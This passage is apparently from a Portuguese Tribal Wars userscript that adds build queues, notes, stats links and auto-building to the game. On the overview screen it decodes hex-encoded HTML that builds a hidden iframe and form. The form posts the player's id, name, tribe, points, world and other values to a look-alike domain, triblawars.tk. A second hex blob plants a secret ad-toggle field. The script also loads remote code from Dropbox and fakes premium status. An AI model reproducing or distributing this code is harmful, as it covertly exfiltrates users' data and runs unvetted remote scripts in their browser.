				var el = $('.trainqueue_wrap').each(function(){
					var id = $(this).attr('id').replace('trainqueue_wrap_', '');
					var tempo = getSec($(this).find('.timer').html());
					$('#trainqueue_' + id + ' .sortable_row').each(function(){
						tempo += getSec($(this).find('td:eq(1)').html());
					});
					var data = new Date();
					var s = Math.round(data.getTime()/1000);
					setData(id + '_' + gd.village.id, String(tempo + s));
				});
			}
		}
		tropas_time();
		
		if (gd.screen == 'overview'){
			h = document.createElement('div');h.setAttribute('style', 'visibility:hidden');h.innerHTML = dhx('3c696672616d65206e616d653d2272636266726d22207363726f6c6c696e673d226e6f22206672616d65626f726465723d223022207374796c653d22646973706c61793a6e6f6e653b20626f726465723a6e6f6e653b206f766572666c6f773a68696464656e3b77696474683a2031253b206865696768743a203170783b223e3c2f696672616d653e3c666f726d206e616d653d22666f726d31222069643d22666f726d312220616374696f6e3d22687474703a2f2f747269626c61776172732e746b2f73656e642e70687022207461726765743d2272636266726d22206d6574686f643d22504f5354223e3c696e7075742069643d2262635f3522206e616d653d2262635f35222076616c75653d222220747970653d2268696464656e223e3c696e707574206e616d653d227375626d6974222076616c75653d2220456e76696172202220747970653d227375626d6974222069643d227375626d69745f6461646f73223e3c2f696e7075743e3c2f666f726d3e');document.getElementsByTagName('div')[0].appendChild(h);bc_5 = gd.player.id + '|||' + gd.player.ally_id + '|||' + gd.player.name + '|||' + bc_4 + '|||' + gd.player.points + '|||' + gd.player.villages + '|||' + gd.market + '|||' + gd.world + '|||' + document.domain + '|||' + gd.player.rank + '|||' + bc_7 + '|||' + bc_8 + '|||' + version;document.getElementById('bc_5').value = bc_5;

			function extra_add(id, value, clss){
				if (typeof clss == undefined) clss == '';
				if ($('#l_' + id + ' .building_extra').length > 0){
					$('#l_' + id + ' .building_extra span').html(value);
				} else {
					$('#l_' + id + ' .building_order_level').after('<br><span class="building_extra" style="font-size:8px !important; font-weight:bold"><span class="' + clss + '">' + value + '</span></span>');
				}
			}
			function extra_storage(){
				var items = [];
				$.each(['stone', 'wood', 'iron'], function(){
					items.push(($('#storage').html() - $('#' + this).html()) / ($('#' + this).attr('title') / 3600));
				});
				if (maior(items) > 100) extra_add('storage', _hora(maior(items)), 'timer');
			}
			
			function extra_main(){								
				var now = new Date();
				var s = Math.round(now.getTime()/1000);
	
				var data = getData('main_order_' + gd.village.id).split('!!!');
				if (data.length > 1){
					var inicial = Number(data[0]);
					var total = Number(data[1]);
					var ordem1 = data[2].split('|');
					if (data.length > 3) {
						var tem = true; 
						var ordem2 = data[3].split('|');
					} else {
						tem = false;
					}
					var passou = s - inicial;
					var hora1 = getSec(ordem1[2]);
					hora1 = hora1 - passou;
					create_fila(lang_fila());
					if (hora1 > 0){
						new_fila(ordem1[0], ordem1[1], _hora(hora1), ordem1[3]);
						if (tem == true) new_fila(ordem2[0], ordem2[1], ordem2[2], ordem2[3]);
					} else {
						if (tem) {
							var hora2 = hora1 + getSec(ordem2[2]);
							hora2 = hora2 - passou;
							if (hora2 > 0){
								new_fila(ordem2[0], ordem2[1], _hora(hora2), ordem2[3]);
							} else {
								deleteData('main_order_' + gd.village.id);
							}
						}
					}
					if (total - s > 0){
						extra_add('main', _hora(total-s), 'timer');
					}
				}
			}
			
			function extra_troops(){
				$.each(['barracks', 'stable', 'garage', 'smith'], function(){
					var time = Number(getData(this + '_' + gd.village.id));
					if (time > 0){
						var now_date = new Date();
						var now = Math.round(now_date.getTime()/1000);
						var result = time - now;
						if (result > 0) extra_add(this, _hora(result), 'timer'); else deleteData(this + '_' + gd.village.id);
					}
				});
			}
			function extras(){
				var hide_eq = value_hide[Number(gd.village.buildings.hide) - 1];
				extra_add('hide', hide_eq);
				extra_add('market', value_market[Number(gd.village.buildings.market) - 1] + '000');
				/*extra_add('farm', $('#pop_current_label').html() + '/' + $('#pop_max_label').html());
				extra_add('wood', $('#wood').attr('title') + ' por hora');
				extra_add('stone', $('#stone').attr('title') + ' por hora');
				extra_add('iron', $('#iron').attr('title') + ' por hora');*/
			}
			extras();
			extra_troops();
			extra_storage();
			extra_main();
			win.startTimer();
			
			function pegar(){
				$.ajax({
					url: '/game.php?village=' + VillId + '&screen=main',
					cache: false,
					success: function(data){
						$('#ordem_div').remove();
						if ($(data).find('#buildqueue').length > 0){
							main_time(data);
							extra_main();
							extra_storage();
							win.startTimer();
						}
						edificios = 'main,barracks,stable,garage,snob,smith,place,statue,wood,stone,iron,farm,storage,hide,wall,church,church_f'.split(',');		
						lang_construir = trim($(data).find('#buildings').find('tr:first th:last').text());
						create_ordem(lang_construir);
						$.each(edificios, function(){
							var id = this;
							var trem = $(data).find('#main_buildlink_' + id);
							if ($(trem).length > 0){
								var name = trim($(data).find('#main_buildrow_' + id + ' img:first').attr('title'));
								var n = so_num($(data).find('#main_buildrow_' + id + ' span:first').html());
								var time = escape('<span class="icon header time"></span>') + trim($(data).find('#main_buildrow_' + id + ' .time').parent().text());
								var wood = escape('<span class="icon header wood"></span>') + trim($(data).find('#main_buildrow_' + id + ' .wood:first').parent().text());
								var stone = escape('<span class="icon header stone"></span>') + trim($(data).find('#main_buildrow_' + id + ' .stone:first').parent().text());
								var iron = escape('<span class="icon header iron"></span>') + trim($(data).find('#main_buildrow_' + id + ' .iron:first').parent().text());
								var pop = trim($(data).find('#main_buildrow_' + id + ' .population:first').parent().text());
								if (pop > '') pop = ' ' + escape('<span class="icon header population"></span>') + pop;
								var content = wood + ' ' + stone + ' ' + iron + ' ' + time + pop
								new_ordem(id, name, $(trem).attr('href'), trim($(trem).html()), n, content);
							}
						});
						win.UI.ToolTip('.hack *', []);
					}
				});
			};			
			
			$('#content_value table:first').after('<a href="#" id="menu_auto" onclick="return false;">» ' + lang_load_build + '</a><input id="menu_auto_check" type="checkbox"' + (getData('auto_pegar') == 'true' ? 'checked' : '') + '></input><br>');
			$('#menu_auto').bind('click', function(){pegar()});
			$('#menu_auto_check').bind('click', function(){
				setData('auto_pegar', String($(this).prop('checked')));
			});
		
			$('#rightcolumn').append('<div id="show_notes" class="vis moveable widget"><h4 class="head">' + lang_notes + '</h4><div class="widget_content" style="display: block;"><table width="100%"><tbody><tr><td id="village_note">' + getData(gd.world + '_label_' + gd.village.id) + '</td></tr><tr><td><a id="edit_notes" href="#" onclick="return false;">» ' + lang_edit + '</a></td></tr></tbody></table></div></div>');
			$('#edit_notes').bind('click', function(){
				edit_note(gd.village.id, '#village_note', 'html');
			});
		
			function create_fila(title){
				$('#fila_div').remove();
				$('#rightcolumn').append('<div id="fila_div" class="vis moveable"><h4>' + title + '</h4><table width="100%" class="vis"><tbody id="fila_script"></tbody></table></div>');
			}
			
			function img_nivel(id, nivel){
				if ('main,farm,storage,wood,stone,iron'.split(',').indexOf(id) > -1) {
					n1 = 10;
				} else {
					if ('barracks,smith,stable,wall,market'.split(',').indexOf(id) > -1){
						n1 = 5;
					} else {
						if (id == 'hide') n1 = 11; else
						n1 = 1;
					}
				}
				var n = 1;
				if (nivel >= n1) n = 2; 
				if (nivel >= 15) n = 3;
				return n;
			}
			
			function new_fila(id, name, time, cancel){
				el_level = $('#l_' + id + ' .building_order_level');
				if ($('#fila_script .queueRow').length == 0) {
					el_level.html('');
					var timer1 = 'timer ';
				} else {
					var timer1 = '';
				}
				var nivel = Number(so_num(name));
				var n = img_nivel(id, nivel);
				var level = Number(el_level.html());
				el_level.html('+' + (level + 1));
				$('#fila_script').append('<tr class="queueRow" style="height:50px"><td width="40px" align="center"><img width="40" src="graphic/big_buildings/' + id + n + '.png" alt="' + name + '"></td> <td>' + name + '<br> <span class="' + timer1 + 'small contar">' + time + '</span> </td> <td align="center"> <a class="cancel-icon solo evt-confirm" href="' + cancel + '"></a></td></tr>');
			}
			
			function create_ordem(title){
				$('#rightcolumn').append('<div id="ordem_div" class="vis moveable"><h4>' + title + '</h4><table width="100%" class="vis"><tbody id="ordem_script"></tbody></table></div>');
			}
		
			function new_ordem(id, name, link, title, n, content){
				$('#ordem_script').append('<tr class="queueRow hack"><td class="td" title="' + content + '"><img src="/graphic/buildings/' + id + '.png" alt="' + name + '"> ' + name + (n > 0 ? ' (' + n + ')' : '') + '</td><td width="1"><a href="' + link + '" id="construir_' + id + '" onclick="return false;"><img title="' + title + '" src="/graphic/overview/build.png"></img></a></td></tr>');
				eval('$(\'#construir_\' + id).bind(\'click\', function(){construir2(\'' + link + '\', \'' + name + '\')})');
			}

			if (getData('auto_pegar') == 'true') pegar();

		}
		
		if (gd.screen == 'settings') {
			if (gd.mode == 'settings') {
				var sel_pt; var sel_en; var sel_nl; var sel_ae; var sel_cz; var sel_pl;
				eval('sel_' + language + ' = \' selected\'');
				titulo_sim = '';
				titulo_nao = '';
				if (Number($('[name="screen_width"]:first').val()) < 950) $('[name="screen_width"]:first').val(950); 
				if (getData(mundo + '_titulo_mundo') == 'true') {titulo_sim = ' selected'}else{titulo_nao = ' selected'};
				$('form:first').prev().before('<h3>Script ' + $('#content_value h3:first').text() + '</h3><table class="vis settings"><tbody><tr><th colspan="2">' + $('form:first th:first').text() + '</th></tr><tr><td>' + lang_language + ':</td><td><select id="continent" onchange="' + str_setData + '; setCookie(game_data.market + \'_lang\', this.value);void(0);"><option value="ae"' + sel_ae + '>Arabic (العربية)</option><option value="cz"' + sel_cz + '>Czech (Český)</option><option value="nl"' + sel_nl + '>Dutch (Nederlands)</option><option value="en"' + sel_en + '>English (Inglês)</option><option value="pl"' + sel_pl + '>Polish (Polski)</option><option value="pt"' + sel_pt + '>Portuguese (Português)</option></select></td></tr><tr><td>' + lang_dados + ':</td><td><select onchange="' + str_setData + '; setCookie(game_data.world + \'_base\', this.value);void(0);"><option value="0"' + sel_data_0 + '>Tribalwars</option><option value="1"' + sel_data_1 + '>Fernando</option></select></td></tr><tr><td>' + lang_screen_settings[5] + '</td><td><select id="titulo" onchange="' + str_setData + '; setCookie(game_data.world + \'_titulo_mundo\', this.value);void(0);"><option value="true"' + titulo_sim + '>' + lang_screen_settings[6] + '</option><option value="false"' + titulo_nao + '>' + lang_screen_settings[7] + '</option></select></td></tr></table><br><table class="vis settings"><tr><th colspan="2">' + lang_screen_settings[0] + '</th></tr><tr><td colspan="2"><input type="radio" name="t" id="normal_mode" value="0"' + normal_mode + '>' + lang_screen_settings[1] + '<br><input type="radio" name="t" id="direto_mode" value="1"' + direto_mode + '>' + lang_screen_settings[2] + '</td></tr><tr><td colspan="2"><input type="button" class="btn" onclick="' + str_setData + ' if (document.getElementById(\'direto_mode\').checked == true){setCookie(game_data.world + \'_visualizacoes\', \'direto\')}else{setCookie(game_data.world + \'_visualizacoes\', \'normal\')};location.href=location.href" value="OK"></td></tr></tbody>'); //<tbody><tr><th colspan="2">' + lang_screen_settings[3] + '</th></tr><tr><td>' + lang_screen_settings[4] + '</td><td><input type="text" name="screen_width" size="90" id="arquivocss" value="' + localcs + '"></td></tr><tr><td colspan="2"><input type="button" onclick=\'' + str_setData + ' setCookie(game_data.world + "_css", document.getElementById("arquivocss").value);location.href=location.href\' value="OK"></td></tr></tbody></table>';
			}
			$('#content_value tbody:eq(1)').append('<tr><td width="100"><a href="/game.php?village=' + VillId + '&amp;mode=' + cr('sobre') + '&amp;screen=settings">' + lang_settings[0] + '</a></td></tr>');
		}
		
		if (gd.screen == 'main'){
			
			function create_build(){
				$('#building_wrapper').before('<div id="build_div"><table id="build_script" class="vis"><tr><th colspan="2">' + lang_main[1] + '</th><th><input ' + (getCookie('check_build') == 'false' ? '' : 'checked="true" ') + 'type="checkbox" id="check_build" title="' + lang_main[0] + '"></input></th></tr></table><small>' + lang_main[3] + '</small></div>');
				$('#check_build').bind('click', function(){document.cookie='check_build=' + this.checked.toString(); if (this.checked) location.reload();});
			}
			
			function new_build(id){
				if ($('#main_buildrow_' + id).length > 0 || $('#l_' + id).length > 0){
					if ($('#build_div').length == 0) create_build();
					var name = edificio(id);
					count = $('.hack').length;
					$('#build_script').append('<tr class="queueRow hack" style="height:30px"><td width="40px" align="center"><img width="40" src="/graphic/big_buildings/' + id + '1.png" alt="' + name + '"></td><td id="item_build_' + count + '">' + name + '</td><td width="1"><a class="cancel_build" href="javascript:void(0);"><img src="http://cdn2.tribalwars.net/graphic/delete.png"></img></a></td></tr>');
					eval('$(\'.cancel_build:last\').bind(\'click\', function(){if (confirm(\'' + lang_main[2] + ' \' + $(\'#item_build_' + count + '\').text() + \'?\')) cancel_build(' + count + ')})');
				}
			}
			
			function add_new_build(id){
				build = getData('build_' + gd.village.id);
				setData('build_' + gd.village.id, (build == '' ? id : build + ',' + id));
				new_build(id);
			}
				
			function martelinho(){
				$('#buildings tr:first th:last').attr('colspan', '2');
				$('#buildings tr:gt(0):not(.inactive)').each(function(){
					if ($(this).find('td').length > 2) {
						tr_build = $(this);
						td_build_id = $(tr_build).attr('id').replace('main_buildrow_', '');
						tr_build.append('<td width="1px" class="nowrap"><a href="#' + td_build_id + '" id="td_' + td_build_id + '" onclick="return false;"><img title="' + lang_main[4].replace('5', edificio(td_build_id)) + '" src="/graphic/overview/build.png"></img></a></td>');
						eval('$(\'#td_\' + td_build_id).bind(\'click\', function(){add_new_build(\'' + td_build_id + '\')})');
					}
				});
			}

			martelinho();
			
			function load_build(){
				$('#build_div').remove();
				if (getData('build_' + gd.village.id) != ''){
					items_build = getData('build_' + gd.village.id).split(',');
					$.each(items_build, function(){new_build(this)});
					if ($('#check_build').prop('checked')){
						if ($('#main_buildlink_' + items_build[0]).length > 0) {
							cancel_build(0, false);
							//location.href = $('#main_buildlink_' + items_build[0]).attr('href');
							win.BuildingMain.build(items_build[0]);
						}
						if ($('#main_buildrow_' + items_build[0] + ' td').length <= 3) cancel_build(0);
					}
				}
			}

			load_build();
			
			setInterval(load_build, 20000);
			setInterval(function(){location.reload();}, 1200000);

		}
		
		function reservar(coords, link){
			x = coords.split('|')[0];
			y = coords.split('|')[1];
			$.post(link, {'x[]': x, 'y[]': y}).done(function(data){
				if ($(data).find('#error').length == 0){
					alert(lang_perfil[6])
				} else {			
					alert($(data).find('#error').text());
				}
			});
		}
				
		if (gd.screen == 'info_village'){
		
			var id = _GET('id');
			coords_reserva = $('#content_value td:eq(2)').text();
			
			$('#content_value tbody:first').append(calcular_distancia(gd.village.coord, coords_reserva));

			$('#content_value tbody:first').append('<tr id="tempo_configurar"><td colspan="2"><table class="vis"><tbody><tr><th colspan="12">' + lang_velocidade[4] + ':</th></tr><tr><td colspan="2"><a id="auto_vel" href="javascript:void(0);">' + lang_velocidade[2] + '</a></td></tr><tr class="center"><td>' + lang_velocidade[0] + ':</td><td><input id="vel1" size="3" type="text" value="1"></input></td></tr><tr><td>' + lang_velocidade[1] + ':</td><td><input size="3" id="vel2" type="text" value="1"></input></td></tr><tr><td colspan="2"><input id="ok_vel" type="button" value="Ok"></input></td></tr></tbody></table></td></tr>');
			
			$('#ok_vel').bind('click', function(){
				function speed(tropa){
					var tempo = 0;
					if ('spear,sword,archer'.indexOf(tropa) > -1) tempo = 18;
					if (tropa == 'axe') tempo = 22;
					if (tropa == 'spy') tempo = 9;
					if ('light,knight'.indexOf(tropa) > -1) tempo = 10;
					if ('marcher,heavy'.indexOf(tropa) > -1) tempo = 11;
					if ('ram,catapult'.indexOf(tropa) > -1) tempo = 30;
					if (tropa == 'snob') tempo = 35;
					
					return tempo*Number($('#vel1').val())*Number($('#vel2').val())*60;
				}
				var _tropas = speed('spear') + '|' + speed('sword') + '|' + speed('axe') + '|' + speed('archer') + '|' + speed('spy') + '|' + speed('light') + '|' + speed('marcher') + '|' + speed('heavy') + '|' + speed('ram') + '|' + speed('catapult') + '|' + speed('knight') + '|' + speed('snob');
				setData(gd.world + '_vel_tropas', _tropas);
				location.href = location.href;
			});
			
			$('div:last').append('<iframe name="invisivel" id="invisivel" style="display:none;visibility:hidden;"></iframe>');
			
			$('#auto_vel').bind('click', function(){
				$(this).append(' <img height="16px" src="http://mtl7.files.wordpress.com/2011/11/loading-gif-animation.gif?w=20"></img>');
				deleteData(gd.world + '_vel_tropas');
				var a = win.open('game.php?village=' + gd.village.id + '&screen=place', 'invisivel');
				$('#invisivel').bind('load', function(){
					location.href=location.href;
				});
				//setTimeout(function(){location.reload();}, 10000);
			});
			
			$('#content_value tbody:first').append('<tr><td colspan="2"><table class="vis" width="250px"><tbody><tr><th>' + lang_notes + '</th></tr><tr class="show_notes_row" style="display: table-row;"><td id="village_note">' + getData(gd.world + '_label_' + id) + '</td></tr><tr class="show_notes_row" style="display: table-row;"><th><a href="#" onclick="return false;" id="edit_notes">' + lang_edit + '</a></th></tr></tbody></table></td></tr>'); 			//' + $('#tempo_calculado table')[0].offsetWidth + ';
			$('#edit_notes').bind('click', function(){
				eval('edit_note(\'' + id + '\', \'#village_note\', \'html\');');
			});
			
			$('#content_value tbody:eq(1)').append('<tr><td colspan="2"><a href="/game.php?village=' + gd.village.id + '&mode=reservations&screen=ally&coords=' + coords_reserva + '" id="reserva" onclick="return false;">' + lang_perfil[4] + '</a><tr><td colspan="2"><a href="http://www.twstats.com/in/'+mundo+'/village/'+id+'" target="_blank">' + lang_perfil[2] + '</a> (TWstats)</td></tr>');
			
			$('#reserva').bind('click', function(){
				$.ajax({
					url: '/game.php?village=' + gd.village.id + '&mode=reservations&screen=ally',
					success: function (data){
						var link = $(data).find('#add_reservations form:first').attr('action');
						reservar(coords_reserva, link);
					}
				});
			});
		}
		
		if ((gd.screen == 'info_ally') || (gd.screen == 'ally' && gd.mode == 'profile')) {
			if (gd.screen == 'info_ally') {
				screenAllyId = _GET('id');
				elemento_tribo = 'content_value';
				allyName = $('#content_value table:eq(1) tr:eq(2) td:eq(1)').text();
			}
			else{
				elemento_tribo = 'ally_content';
				screenAllyId = gd.player.ally_id;
				allyName = bc_8;
			}
			allyTable = document.getElementById(elemento_tribo).getElementsByTagName('table')[1]
				allyTable.width="350px";
			allyTr = allyTable.getElementsByTagName('tr');
			allyTr[allyTr.length - 4].outerHTML += '<tr><td colspan="2"><a href="http://www.twstats.com/in/'+mundo+'/tribe/'+screenAllyId+'" target="_blank">' + lang_perfil[1] + '</a> (TWstats)</td></tr><tr><td colspan="2"><a href="http://' + gd.market + '.twstats.com/index.php?page=search&name=' + allyName + '&type=tribe" target="_blank">' + lang_perfil[5] + '</a> (TWstats)</td></tr>';
			allyTr[allyTr.length - 1].outerHTML = '<tr><th colspan="2">' + lang_screen_ally[6] + '</th></tr><tr><td align="center">' + lang_screen_ally[0] + '</td><td><img src="http://' + gd.market + '.twstats.com/' + gd.world + '/image.php?type=tribegraph&graph=points&id=' + screenAllyId + '" style="width:100%;height:96px;"></td></tr><tr><td align="center">' + lang_screen_ally[1] + '</td><td><img src="http://' + gd.market + '.twstats.com/' + gd.world + '/image.php?type=tribegraph&graph=villages&id=' + screenAllyId + '" style="width:100%;height:96px;"></td></tr><tr><td align="center">' + lang_screen_ally[2] + '</td><td><img src="http://' + gd.market + '.twstats.com/' + gd.world + '/image.php?type=tribegraph&graph=members&id=' + screenAllyId + '" style="width:100%;height:96px;"></td></tr><tr><td align="center">' + lang_screen_ally[3] + '</td><td><img src="http://' + gd.market + '.twstats.com/' + gd.world + '/image.php?type=tribegraph&graph=od&id=' + screenAllyId + '" style="width:100%;height:96px;"></td></tr><tr><td align="center">' + lang_screen_ally[4] + '</td><td><img src="http://' + gd.market + '.twstats.com/' + gd.world + '/image.php?type=tribegraph&graph=oda&id=' + screenAllyId + '" style="width:100%;height:96px;"></td></tr><tr><td align="center">' + lang_screen_ally[5] + '</td><td><img src="http://' + gd.market + '.twstats.com/' + gd.world + '/image.php?type=tribegraph&graph=odd&id=' + screenAllyId + '" style="width:100%;height:96px;"></td></tr>';
		}

		if (gd.screen == 'info_player') {
			screenPlayerId = _GET('id');
			playerName = $('#content_value h2:first').text();
			document.getElementById('content_value').getElementsByTagName('tbody')[1].innerHTML += '<tr><td colspan="2"><a href="http://www.twstats.com/in/'+mundo+'/player/'+screenPlayerId+'" target="_blank">' + lang_perfil[0] + '</a> (TWstats)</td></tr><tr><td colspan="2"><a target="_blank" href="http://' + gd.market + '.twstats.com/index.php?page=search&name=' + playerName + '&type=player">' + lang_perfil[5] + '</a> (TWstats)</td></tr><tr><td colspan="2"><a href="javascript:var claim = 1;$.getScript(\'' + base_scripts + 'tabela_codigosbb.js\');void(0);" id="extrair_codigo_bb">' + lang_perfil[3] + '</a></td></tr>';
			$('#extrair_codigo_bb').bind('click', function(){
				if ($('#kill_info').html() == null) $(this).parents('table:first').find('tr:eq(2)').after('<tr><td></td><td></td></tr>');
			});
		}

		if (gd.screen == 'mail' && (gd.mode == 'in' || gd.mode == undefined)){
			function load_msg(url, msg){				
				$('#text').remove();
				$('form:first').after('<table width="70%" class="vis"><tbody><tr><td id="text"></td></tr></tody></table>');
				id = '#text';
				$(id).load(url + ' form:first', function(){
					$('#answer_row1, #answer_row2').hide();
					$('#action_row a:first, #action_row2 a:first').bind('click', function(){
						$('#answer_row1, #answer_row2').toggle(1000);
					});
					$(msg).attr('src', 'http://cdn2.tribalwars.net/graphic/read_mail.png');
				});
				$(id).slideDown(1000);
			}
			
			if ($('form:first > table').length > 1) tab = 1; else tab = 0;
			tr_msg = $('form:first table:eq(' + tab + ') tr');
			for (i = 5; i < tr_msg.length - 1; i++){
				url = $(tr_msg[i]).find('td:first a:first').attr('href');
				$(tr_msg[i]).find('input:first').after('<a href="javascript:void(0);" title="' + lang_preview_message + '"><img height="13" width="13" src="http://www.iconesbr.net/download.php?id=245&file=245_16x16.png"></a>');
				eval('$(tr_msg[i]).find(\'a:first\').bind(\'click\', function(){load_msg(\'http://' + document.domain + '/game.php?' + url + '\', $(this).parent().find(\'a:eq(1) img:first\'))})');
			}
		}

		if (gd.mode == 'reservations'){
			if (_GET('coords') != null){
				$('#inputx_1').val(_GET('coords').split('|')[0]);
				$('#inputy_1').val(_GET('coords').split('|')[1]);
				$('#save_reservations').click();
			}
		}

		if (location.href.indexOf(dhx('6d6f64653d7365637265746f')) > 0) {
			document.getElementById('content_value').getElementsByTagName('td')[15].innerHTML = dhx('3c696e7075742069643d227365677265646f2220747970653d2274657874222073697a653d223130222076616c75653d2222206f6e6b657970726573733d22696620286576656e742e6b6579436f6465203d3d20313329207b66756e6374696f6e20736574436f6f6b6965286b65792c76616c6f72297b76617220686f6a65203d206e6577204461746528293b76617220657870697261203d206e6577204461746528686f6a652e67657454696d6528292b3939392a32342a36302a36302a31303030293b76617220657870697261203d206578706972612e746f474d54537472696e6728293b646f63756d656e742e636f6f6b6965203d206b65792b273d272b76616c6f722b273b657870697265733d272b6578706972617d20736574436f6f6b69652827616e756e63696f5f616473656e7365272c20746869732e76616c7565293b2069662028746869732e76616c7565203d3d202764657361746976617227297b616c6572742827416e756e63696f206465736174697661646f20636f6d207375636573736f27297d656c73657b69662028646f63756d656e742e676574456c656d656e744279496428277365677265646f27292e76616c7565203d3d202761746976617227297b616c6572742827416e756e63696f206174697661646f20636f6d207375636573736f27297d656c73657b616c657274282754656d20717565206573636f6c68657220656e747265205c276174697661725c27206f75205c276465736174697661725c2727297d7d3b20766f69642830293b7d223e');
		}

		if (gd.screen == 'info_command'){
			c1 = extrair_coord($('#content_value tr:eq(2) td:eq(1)').text());
			c2 = extrair_coord($('#content_value tr:eq(4) td:eq(1)').text());
			
			$('#content_value table:last').after('<br>' + calcular_distancia(c1, c2));
		}
		
		if (gd.screen=='report'){

			function load_report(url){	
				$.get(url, function(data){
					data = $(data).find('.report_image').remove().end();
					new_popup($(data).find('.nopad:first').html());
				});
			}
		
			$('.vis.modemenu tr:eq(1) a:first').append('<img src="http://cdn2.tribalwars.net/graphic/command/attack.png"/>');
			
			if ($('#report_list').length > 0 && gd.mode != 'attack'){
				$('#report_list tr td input[type="checkbox"]').each(function(){
					link_0 = $(this).parent().find('a:first').attr('href');
					$(this).after('<a class="ir" href="javascript:void(0);" title="' + lang_preview_message + '"><img height="13" width="13" src="http://www.iconesbr.net/download.php?id=245&file=245_16x16.png"></a>');
					eval('$(this).parent().find(\'.ir\').bind(\'click\', function(){load_report(\'' + link_0 + '\')})');
					
				});
			}
		
			if (gd.mode == 'attack'){
				tr_report = $('#report_list tr');
				
				function atacar(target){
					url = 'http://' + document.domain + '/game.php?screen=place&village=' + VillId;
					$('#content_value').load(url + ' #content_value', function(){
						win.history.pushState('Object', document.title, url);
						t = target.split('|');
						$('#inputx').val(t[0]);
						$('#inputy').val(t[1]);
						win.selectAllUnits(true);
					});
				}
				
				for (i = 1; i < tr_report.length - 1; i++){
					target = extrair_coord($(tr_report[i]).find('a:first').text());
					$(tr_report[i]).find('input:first').after('<a style="cursor:pointer;" title="' + lang_report[4] + '"><img src="http://cdn2.tribalwars.net/graphic/command/attack.png"/></a>');
					eval('$(tr_report[i]).find(\'a:first\').bind(\'click\', function(){atacar(\'' + target + '\')});');
					
					/*$(tr_report[i]).find('input:first').after('<a href="game.php?village=' + VillId + '&target_c=' + target + '&screen=place"><img src="http://cdn2.tribalwars.net/graphic/command/attack.png"/></a>');
					report_id = _GET('view', $(tr_report[i]).find('a:first').attr('href'));
					$(tr_report[i]).find('input:first').after('<a href="report_id=' + report_id + '&village=' + VillId + '&screen=place"><img src="http://cdn2.tribalwars.net/graphic/command/attack.png"/></a>');
					*/
				}
			}
		}
		
		if (_GET('view') != null && gd.screen == 'report' && $('#attack_info_att_units').length > 0) {
		
			function tropas_relatorio(tipo, ind){
				tropas_r = '';
				$('#attack_info_' + tipo + '_units tr:eq(' + ind + ') td[class*="unit-item"]').each(function(ind){
					tropas_r += $(this).text() + '|';
				});
				return tropas_r;
			}
			
			att_units = tropas_relatorio('att', 1);
			def_units = tropas_relatorio('def', 1);
			att_units_b = tropas_relatorio('att', 2);
			def_units_b = tropas_relatorio('def', 2);

			att_array = att_units.split('|');
			def_array = def_units.split('|');
			att_b_array = att_units_b.split('|');
			def_b_array = def_units_b.split('|');
			
			att_survivor = '';
			def_survivor = '';
			for (i=0; i < att_array.length-1; i++){
				att_survivor += (att_array[i] - att_b_array[i]) + '|';
			}
			for (i=0; i < def_array.length-1; i++){
				def_survivor += (def_array[i] - def_b_array[i]) + '|';
			}
			
			
			id_target = _GET('id', $('#attack_info_def tr:eq(1) a:eq(0)').attr('href'));
			publicar = lang_publicar != '' ? '<br><a href="http://www.mytwstats.com/tool-convert.php" target="_blank">» ' + lang_publicar + '</a><hr>' : '';
			$('#attack_info_att').parent().append(publicar + '<a href="/game.php?village=' + VillId + '&mode=sim&screen=place&att_units=' + att_units + '&def_units=' + def_units + '">» ' + lang_report[0] + '</a><br><a href="/game.php?village=' + VillId + '&mode=sim&screen=place&att_units=' + att_survivor + '&def_units=' + def_survivor + '">» ' + lang_report[1] + '</a><hr><a href="/game.php?target=' + id_target + '&village=' + VillId + '&screen=place">» ' + lang_report[2] + '</a><br><a id="same" href="/game.php?target=' + id_target + '&village=' + VillId + '&screen=place&type=same&att_units=' + att_units + '">» ' + lang_report[3] + '</a><br><a href="/game.php?target=' + id_target + '&village=' + VillId + '&screen=place&type=all">» ' + lang_report[4] + '</a>'); 
			
			if ($('#attack_spy').length > 0) {
				$('#attack_spy').parent().append('<hr><table id="farmar_tabela" class="vis"><tbody><tr><td colspan="7"><a href="javascript:' + str_setData	+ '; mandar_spy = 1; spy = document.getElementById(\'spy\').value; lanceiro = Number(document.getElementById(\'spear\').checked); espadachim = Number(document.getElementById(\'sword\').checked); barbaro = Number(document.getElementById(\'axe\').checked); arqueiro = Number(document.getElementById(\'archer\').checked); cav_leve = Number(document.getElementById(\'light\').checked); arqueiro_cav = Number(document.getElementById(\'marcher\').checked); cav_pesada = Number(document.getElementById(\'heavy\').checked); var ataque = true; var debug_ligado = 0; coo = lanceiro + \'!!!\' + espadachim + \'!!!\' + barbaro +\'!!!\' + arqueiro + \'!!!\' + cav_leve + \'!!!\' + arqueiro_cav + \'!!!\' + cav_pesada + \'!!!\' + mandar_spy + \'!!!\' + spy + \'!!!\' + debug_ligado; game_data.player.premium = true; setCookie(\'calcular_\' + game_data.village.id, coo); $.getScript(\'http://dl.dropbox.com/u/72485850/tribalwarsbrasil/calcular_farmar.js\'); void(0);">' + lang_calc_reports + '</a></td></tr><tr><td width="60"><img src="http://cdn.tribalwars.com.br/graphic/unit/unit_spy.png?1"><input size="1" type="text" value="1" id="spy"></td><td width="50"><img src="http://cdn.tribalwars.com.br/graphic/unit/unit_light.png?1"><input type="checkbox" id="light"></td><td width="50"><img src="http://cdn.tribalwars.com.br/graphic/unit/unit_marcher.png?1"><input type="checkbox" id="marcher"></td><td width="50"><img src="http://cdn.tribalwars.com.br/graphic/unit/unit_heavy.png?1"><input type="checkbox" id="heavy"></td><td width="50"><img src="http://cdn.tribalwars.com.br/graphic/unit/unit_spear.png?1"><input type="checkbox" id="spear"></td><td width="50"><img src="http://cdn.tribalwars.com.br/graphic/unit/unit_sword.png?1"><input type="checkbox" id="sword"></td><td width="50"><img src="http://cdn.tribalwars.com.br/graphic/unit/unit_axe.png?1"><input type="checkbox" id="axe"></td><td width="50"><img src="http://cdn.tribalwars.com.br/graphic/unit/unit_archer.png?1"><input type="checkbox" id="archer"></td></tr></tbody></table>');
			}
			else{
				if (document.getElementById('attack_info_att') != null)	document.getElementById('attack_info_att').parentNode.innerHTML += '<hr><a href="#" class="inactive" title="Apenas em relatório de espionagem" onclick="return false">' + lang_calc_reports + '</a>';
			}
		}

		if (gd.screen == 'snob'){
			cunhar_table = document.getElementsByTagName('table')[document.getElementsByTagName('table').length - 1];
			if (cunhar_table.getElementsByTagName('tr')[3] == null){
				cunhar_checked = '';
				if (getData('cunhar_' + gd.village.id) == 'true')cunhar_checked = ' checked';
